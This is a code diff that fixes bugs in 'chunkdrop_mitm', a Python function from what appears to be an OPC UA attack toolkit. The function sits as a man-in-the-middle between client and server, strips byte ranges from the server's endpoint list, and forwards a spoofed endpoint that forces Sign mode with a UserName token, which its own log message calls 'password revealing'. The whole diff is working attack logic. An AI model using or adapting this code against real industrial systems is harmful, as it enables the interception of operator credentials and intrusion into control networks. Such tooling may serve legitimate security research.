@@ -1770,6 +1770,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
     
     # Drop a certain amount of bytes. Throws an error if end is reached.
     def dropbytes(count):
+      # print(f'dropbytes {count}')
       nonlocal cursor, result
       if count == 0:
         return
@@ -1777,7 +1778,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
       assert(count > 0)
       if cursor < len(ep_bytes):
         if result and result[-1][1] == cursor:
-          result[-1][1] += count
+          result[-1] = (result[-1][0], result[-1][1] + count)
         else:
           result += [(cursor, cursor + count)]
         cursor += count
@@ -1792,11 +1793,12 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
     
     # Keep dropping ranges until a specific desired byte range is added to the result.
     def drop_until_bytes(byteseq):
+      # print(f'drop_until_bytes {repr(byteseq)}')
       nonlocal cursor
       
       tomatch = byteseq
       while tomatch:
-        if ep_bytes and ep_bytes[0] == tomatch[0]:
+        if cursor < len(ep_bytes) and ep_bytes[cursor] == tomatch[0]:
           cursor += 1
           tomatch = tomatch[1:]
         else:
@@ -1804,6 +1806,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
     
     # Drop bytes until the cursor is positioned in front of a specific endpoint field.
     def drop_until_field(fieldname):
+      # print(f'drop_until_field {fieldname}')
       nonlocal cursor
       
       # Find starting offset of endpoint the cursor is currently in.
@@ -1827,10 +1830,12 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
       
     # Consume a field. Keep it (and return True) if it meets the predicate. Otherwise drop it.
     def checkfield(fieldType, predicate=lambda _: True):
+      # print(f'checkfield {type(fieldType).__name__}')
       nonlocal cursor
       
       field, tail = fieldType.from_bytes(ep_bytes[cursor:])
       fieldsize = len(ep_bytes) - cursor - len(tail) 
+      assert(fieldsize > 0)
       if predicate(field):
         cursor += fieldsize
         return True
@@ -1842,6 +1847,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
     drop_until_bytes(b'\x01\x00\x00\x00')
     
     # Keep general server info.
+    drop_until_field('endpointUrl')
     checkfield(StringField()) # endpointUrl
     checkfield(applicationDescription) # server
     checkfield(ByteStringField()) # serverCertificate
@@ -1857,7 +1863,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
     drop_until_bytes(b'\x01\x00\x00\x00' * 2)
     
     # Set single policyId character to whatever.
-    dropbytes(1)
+    cursor += 1
     
     # Enforce UserName token type.
     drop_until_bytes(EnumField(UserTokenType).to_bytes(UserTokenType.USERNAME))
@@ -1884,7 +1890,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
   server_epbytes = ArrayField(endpointDescription).to_bytes(server_eps)
   dropranges = ranges_to_drop(server_epbytes)
   
-  if not any(ep.securityMode == MessageSecurityMode.SIGN):
+  if not any(ep.securityMode == MessageSecurityMode.SIGN for ep in server_eps):
     log('Warning: server does not advertise Sign security mode. Attack will probably not work, but trying anyway.')
   
   # Compute new endpoint list (and double-check if calculation was correct).
@@ -1894,7 +1900,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
     spoofed_epbytes += server_epbytes[prev_end:start]
     prev_end = end
   spoofed_epbytes += server_epbytes[prev_end:]
-  spoofed_ep = ArrayField(endpointDescription).from_bytes(spoofed_epbytes)[0]
+  spoofed_ep = ArrayField(endpointDescription).from_bytes(spoofed_epbytes)[0][0]
   
   assert(spoofed_ep.securityMode == MessageSecurityMode.SIGN and spoofed_ep.userIdentityTokens[0].tokenType == UserTokenType.USERNAME)
   log_success('Succesfully transformed token list into spoofed (password revealing) variant.')
@@ -1926,7 +1932,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
       
       read_client_msg(clientsock, HelloMessage)
       log('Got Hello from client. Sending spoofed version to server.')
-      write_client_msg(opc_exchange(serversock, spoofed_hello, AckMessage()))
+      write_client_msg(clientsock, opc_exchange(serversock, spoofed_hello, AckMessage()))
       
       # Forward OPN. Response may be chunked.
       client_opn = read_client_msg(clientsock, OpenSecureChannelMessage)
@@ -1945,7 +1951,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
           
           # Check client message.
           try:
-            reqbytes, _ = encodedConversation.from_bytes(client_convo.encodedPart)
+            reqbytes = encodedConversation.from_bytes(client_convo.encodedPart)[0].requestOrResponse
           except DecodeError as err:
             if not cleartext:
               raise AttackNotPossible('Could not decode conversation. It is probably using SignAndEncrypt mode.')
@@ -1983,9 +1989,9 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
               write_client_msg(clientsock, ConversationMessage(
                 secureChannelId=server_chunks[0].secureChannelId,
                 tokenId=server_chunks[0].tokenId,
-                encodedPart=encodedConversation.from_bytes(server_chunks[0].encodedPart)._replace(
-                  requestOrResponse=resp._replace(endpoints=[spoofed_ep])
-                )
+                encodedPart=encodedConversation.to_bytes(encodedConversation.from_bytes(server_chunks[0].encodedPart)[0]._replace(
+                  requestOrResponse=getEndpointsResponse.to_bytes(resp._replace(endpoints=[spoofed_ep]))
+                ))
               ))
             elif createSessionResponse.check_type(respbytes):
               if not all(len(part) == 1 for part in resp_parts):
